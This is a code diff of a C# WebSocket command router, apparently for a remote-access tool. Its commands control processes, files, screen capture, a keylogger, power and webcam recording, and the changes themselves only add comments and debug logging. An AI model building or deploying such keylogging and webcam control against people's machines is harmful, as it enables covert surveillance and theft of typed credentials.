@@ -35,6 +35,7 @@ namespace WebSocketTest.Core
             {
                 switch (cmd)
                 {
+                    // ===== APPS =====
                     case "listApps":
                         return _appService.GetApplicationList();
                     case "stopApp":
@@ -42,12 +43,14 @@ namespace WebSocketTest.Core
                     case "startApp":
                         return _appService.StartApp(arg);
 
+                    // ===== PROCESSES =====
                     case "listProcesses":
                         return _processService.GetFullProcessList();
                     case "killProcess":
                         if (int.TryParse(arg, out int pid)) return _processService.KillProcessByPid(pid);
                         return JsonResponse.Error("PID phải là số");
 
+                    // ===== FILE MANAGER =====
                     case "list_dir":
                         _ = Task.Run(async () =>
                         {
@@ -77,12 +80,11 @@ namespace WebSocketTest.Core
                         });
                         return JsonResponse.Info("Starting download...");
 
-                    case "PING":
-                        return "PONG";
-
+                    // ===== SCREEN CAPTURE =====
                     case "get_screen":
                         return _screenService.GetScreen();
 
+                    // ===== KEYLOGGER =====
                     case "keylog_start":
                         KeyLoggerService.Start();
                         return JsonResponse.Success("Đã bắt đầu ghi phím (Keylogger Started).");
@@ -93,7 +95,7 @@ namespace WebSocketTest.Core
                         KeyLoggerService.ClearLogs();
                         return $"{{\"type\": \"keylog_data\", \"data\": \"{safeLogs}\"}}";
 
-
+                    // ===== POWER =====
                     case "shutdown":
                         ShutdownRestart.Shutdown();
                         return JsonResponse.Success("Lệnh tắt máy đã được gửi.");
@@ -101,16 +103,17 @@ namespace WebSocketTest.Core
                         ShutdownRestart.Restart();
                         return JsonResponse.Success("Lệnh khởi động lại đã được gửi.");
 
-                    // Trong Router.cs - thay đổi case get_cam:
-
+                    // ===== WEBCAM (NEW IMPLEMENTATION) =====
                     case "start_cam":
-                        // Parse duration from argument
+                        Console.WriteLine("🔴 [ROUTER] Matched start_cam!"); // ← THÊM DÒNG NÀY
+                        
                         if (!int.TryParse(arg, out int duration) || duration < 5 || duration > 300)
                         {
                             return JsonResponse.Error("Duration phải từ 5-300 giây");
                         }
                         
-                        // ✅ FIX: Sử dụng async Task.Run đúng cách
+                        Console.WriteLine($"🔴 [ROUTER] Calling WebcamService with duration: {duration}"); // ← THÊM
+                        
                         _ = Task.Run(async () =>
                         {
                             try
@@ -120,20 +123,30 @@ namespace WebSocketTest.Core
                             }
                             catch (Exception ex)
                             {
+                                Console.WriteLine($"🔴 [ROUTER] ERROR: {ex.Message}");
                                 await _sendAsync(JsonResponse.Error("Lỗi camera: " + ex.Message));
                             }
                         });
                         return JsonResponse.Info("Starting camera...");
 
                     case "stop_cam":
+                        Console.WriteLine("🔴 [ROUTER] Matched stop_cam!"); // ← THÊM DÒNG NÀY
                         _webcamService.StopRecording();
                         return JsonResponse.Info("Stopping recording...");
 
+                    // ===== PING =====
+                    case "PING":
+                        return "PONG";
+
+                    // ===== DEFAULT =====
                     default:
                         return message;
                 }
             }
-            catch (Exception ex) { return JsonResponse.Error("Lỗi Server: " + ex.Message); }
+            catch (Exception ex) 
+            { 
+                return JsonResponse.Error("Lỗi Server: " + ex.Message); 
+            }
         }
     }
 }
